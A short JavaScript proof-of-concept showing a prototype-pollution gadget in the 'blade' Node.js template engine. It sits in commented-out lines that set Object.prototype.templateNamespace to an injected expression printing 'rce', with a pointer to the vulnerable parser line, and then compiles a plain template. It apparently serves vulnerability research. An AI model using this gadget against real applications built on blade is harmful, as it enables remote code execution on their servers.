const blade = require('blade');

/**
 * prototype pollution
 */

// Object.prototype.templateNamespace = "[__=console.log('rce')?'':{}]"
// Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316

const template = `html
    head
        title Blade
    body
        #content.center
            h1 Blade is cool`;

blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});
